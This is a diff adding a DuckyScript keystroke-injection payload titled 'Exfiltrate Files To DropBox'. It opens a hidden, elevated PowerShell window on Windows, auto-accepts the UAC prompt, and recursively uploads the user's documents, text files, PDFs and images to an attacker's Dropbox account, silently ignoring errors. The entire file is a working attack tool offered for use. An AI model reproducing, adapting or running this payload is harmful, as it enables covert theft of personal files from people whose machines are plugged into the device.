@@ -1,0 +1,38 @@
+REM Title: Exfiltrate Files To DropBox
+REM Author: @beigeworm
+REM Description: Uses Powershell to Exfiltrate all files of all specified filetypes to a DropBox account.
+REM Target: Windows 10,11
+
+REM SETUP
+REM make an app at https://www.dropbox.com/developers/apps (make sure to grant full access to your new app)
+REM generate an access token for your app and replace DROPBOX_ACCESS_TOKEN_HERE.
+
+REM Setup for duckyscript
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window)
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+
+STRING $accessToken = "DROPBOX_ACCESS_TOKEN_HERE" 
+STRING ;$localFolderPath = "$env:USERPROFILE"; $computerName = "$env:COMPUTERNAME"; $dropboxCreateFolderUrl = "https://api.dropboxapi.com/2/files/create_folder_v2" 
+STRING ;$dropboxFolderPath = $computerName.ToString(); $dropboxUploadUrl = "https://content.dropboxapi.com/2/files/upload" 
+ENTER
+STRING $headers = @{"Authorization" = "Bearer $accessToken"
+ENTER
+STRING "Content-Type" = "application/octet-stream"}
+ENTER
+STRING $body = @{"path" = "/$computerName"
+ENTER
+STRING "autorename" = $true}| ConvertTo-Json; $files = Get-ChildItem -Path $localFolderPath -Include "*.docx","*.txt","*.pdf","*.jpg","*.png" -Recurse 
+ENTER
+STRING foreach($file in $files){$relativePath = $file.FullName.Replace($localFolderPath, '').TrimStart('\') 
+STRING ;$dropboxFilePath = "$dropboxFolderPath/$relativePath".Replace('\', '/') 
+STRING ;$headers["Dropbox-API-Arg"] = "{`"path`": `"/$dropboxFilePath`", `"mode`": `"add`", `"autorename`": true, `"mute`": false}" 
+STRING ;try{$fileBytes = [System.IO.File]::ReadAllBytes($file.FullName) 
+STRING ;$response = Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $headers -Body $fileBytes}catch{}} 
+ENTER
